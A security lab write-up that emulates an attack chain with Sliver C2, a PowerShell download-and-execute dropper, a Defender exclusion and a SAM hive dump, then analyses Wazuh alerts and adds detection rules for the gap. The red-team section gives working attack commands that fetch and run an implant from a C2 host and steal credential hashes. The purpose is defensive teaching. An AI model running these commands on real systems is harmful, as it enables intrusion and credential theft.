# Lab 1 — Initial Access & C2 (Sliver) + Detection Gap Analysis

## Scenario Goal

Simulate a full attack chain: deliver an implant to a workstation, establish a C2 session, perform post-exploitation — then analyze what the SIEM caught, what it missed, and why.

**Target:** SOC-WIN10-01 (192.168.1.110)
**Vector:** PowerShell dropper → Sliver implant (mTLS) → SAM dump

---

## 🔴 Red Team — Attack Emulation

### 1. C2 Infrastructure

On the attacker machine I set up Sliver C2:

```bash
sliver > mtls -l 8888
sliver > generate --mtls 192.168.1.150:8888 --os windows --arch amd64 --save /home/socadmin/test.exe
sliver > websites add-content --website lab --web-path /test.exe --content /home/socadmin/test.exe
```

mTLS listener on port 8888 handles callbacks from the infected machine. The implant is served via Sliver's built-in HTTP server on port 8080.

### 2. Delivery & Execution on the Target

On SOC-WIN10-01 I prepared a "drop zone" — a folder excluded from Defender (which is itself an IoC, technique T1562.001):

```powershell
New-Item -Path "C:\c2" -ItemType Directory
Add-MpPreference -ExclusionPath "C:\c2"
```

Download and execute the implant:

```powershell
$url = "http://192.168.1.150:8080/proba.exe"
$out = "C:\c2\test.exe"
$cl  = New-Object System.Net.WebClient
$cl.DownloadFile($url, $out)

Start-Process "C:\c2\test.exe"
```

### 3. Post-Exploitation

After the C2 session was established — reconnaissance and credential theft:

```
sliver > sessions
sliver > use 934e2cb2
sliver > shell

PS> reg save HKLM\SAM C:\c2\sam.save
PS> net localgroup administrators
```

Dumping the SAM hive gives the attacker local user password hashes.

---

## 🔵 Blue Team — SOC Analysis

### L1 Perspective: Alert Triage

The analysis started from a **level 14 alert** — Wazuh detected `reg.exe` being used to dump the SAM hive (rule 92026). Standard triage process:

1. **Alert:** `reg.exe save HKLM\SAM C:\c2\sam.save` — confirmed as True Positive
2. **Pivot:** Parent process is `powershell.exe` with flags suggesting a C2 session
3. **Backward correlation:** 8 minutes earlier, the same host generated a level 6 alert (Ingress Tool Transfer) — PowerShell connected to 192.168.1.150 and wrote `test.exe` to disk
4. **Reconstruction:** Full chain: folder exclusion → exe download → execution → C2 session → SAM dump

### Evidence Logs

**Sysmon EID 11 — File Created** (implant written to disk):
```
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\c2\test.exe
UtcTime: 2026-03-22 20:39:44.109
User: SOCLAB\Administrator
```

**Sysmon EID 1 — Process Create** (SAM dump):
```
Image: C:\Windows\System32\reg.exe
CommandLine: "C:\Windows\system32\reg.exe" save HKLM\SAM C:\c2\sam.save
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: SOCLAB\Administrator
IntegrityLevel: High
```

### Wazuh Alerts (chronological)

| # | Alert | Rule ID | Level | Timestamp |
|---|---|---|---|---|
| 1 | Executable file created by PowerShell: C:\c2\test.exe | 92203 | 6 | 13:39:46 |
| 2 | Discovery activity executed | 92031 | 3 | 13:39:46 |
| 3 | Reg.exe used to dump SAM hive | 92026 | **14** | 13:47:31 |
| 4 | Discovery activity spawned via PowerShell | 92033 | 3 | 13:48:10 |

### The Problem: 8-Minute Visibility Gap

Between the level 6 alert (file write) and the level 14 alert (SAM dump), 8 minutes passed. During that time the attacker:
- launched the implant
- established a C2 session
- ran reconnaissance commands

Wazuh didn't see any of this because launching `test.exe` was just "another process, level 0, ignore." The default rules have no concept of an exe from `C:\c2` being suspicious.

---

## 🟣 Detection Engineering — Closing the Gap

I wrote a cascade of 4 rules that eliminate this blind spot. Full XML in [`detection-rules/wazuh/execution-cascade.xml`](../detection-rules/wazuh/execution-cascade.xml).

### Cascade Logic

**100510 (level 0, silent)** — Entry gate. Fires when Sysmon EID 1 shows an interpreter (PowerShell, cmd, wscript, cscript, mshta, wmic) spawning any `.exe` from outside standard directories. Doesn't generate an alert — just tags the event for child rules to consume.

**100511 (level 11)** — Main detection rule. Takes events from 100510 and checks whether the process name is on a whitelist of known applications (Chrome updater, Teams, OneDrive, VS Code). If not — alert. Tuning means adding process names to the `negate` regex.

**100512 (level 12)** — Masquerading detection. Highest priority in the cascade. Catches scenarios where the attacker names their implant after a system process (svchost.exe, lsass.exe, csrss.exe) but runs it from a writable path. In production, a real svchost never lives in `C:\c2\`.

**100513 (level 10)** — Safety net. Catches execution from non-standard root directories (C:\tools, C:\temp, C:\c2). Covers cases that slip through 100511 and 100512.

### Result

Time from unknown exe execution to alert: **from ~8 minutes down to seconds**. Rule 100511 would have fired the moment `test.exe` started, before the attacker could do anything in the C2 session.

---

## Recommendations (as in a real incident report)

| Priority | Action | Details |
|---|---|---|
| CRITICAL | Host isolation + account lockout | Disconnect SOC-WIN10-01 from the network, temporarily lock SOCLAB\Administrator |
| HIGH | Credential reset | Force password change for all privileged accounts active on the machine during the incident |
| MEDIUM | Persistence analysis | Check Run/RunOnce registry keys and scheduled tasks for entries related to the implant |
| MEDIUM | Network traffic analysis | Review firewall logs for connections to 192.168.1.150 from other workstations |
